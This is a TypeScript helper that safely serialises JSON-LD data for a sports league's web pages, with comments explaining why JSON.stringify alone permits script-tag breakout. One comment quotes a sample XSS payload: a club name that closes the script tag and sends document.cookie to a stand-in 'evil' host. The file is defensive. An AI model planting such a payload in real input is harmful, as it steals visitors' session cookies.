/**
 * Serialise structured data for embedding in a `<script type="application/ld+json">`.
 *
 * ── WHY `JSON.stringify` ALONE IS AN XSS ────────────────────────────────────
 * `JSON.stringify` escapes what JSON requires and nothing else. It leaves `<`
 * and `>` untouched, because they are perfectly legal inside a JSON string —
 * but the output here is not being parsed as JSON, it is being pasted into the
 * HTML source inside a `<script>` element. An HTML parser scanning that element
 * stops at the first `</script` it sees, wherever it appears.
 *
 * So a club named:
 *
 *     Rutland Rovers</script><script>fetch('https://evil/'+document.cookie)</script>
 *
 * closes our tag early and runs as script on the league's own origin. And club
 * names are not hypothetical attacker-controlled input here: they arrive from
 * the CSV importer and the legacy JSON importer, both of which take whatever a
 * twelve-year-old export happens to contain.
 *
 * Escaping to `\uXXXX` keeps the JSON semantically identical — a JSON parser
 * decodes the escape back to the same character — while making the text
 * invisible to the HTML tokeniser.
 * ────────────────────────────────────────────────────────────────────────────
 */

/**
 * U+2028 and U+2029 are escaped for a different reason from the rest: they are
 * valid inside a JSON string but are LINE TERMINATORS in JavaScript, so an
 * unescaped one is a syntax error in the embedded block.
 *
 * Built from `String.fromCharCode` rather than written literally, for exactly
 * that reason — pasted into this file as characters, they end the line
 * mid-expression and this module fails to parse. Which it did, once.
 */
const LINE_SEPARATOR = new RegExp(String.fromCharCode(0x2028), 'g');
const PARAGRAPH_SEPARATOR = new RegExp(String.fromCharCode(0x2029), 'g');

export function serializeJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    // `&` so an entity in the source cannot be re-interpreted by the parser.
    .replace(/&/g, '\\u0026')
    .replace(LINE_SEPARATOR, '\\u2028')
    .replace(PARAGRAPH_SEPARATOR, '\\u2029');
}
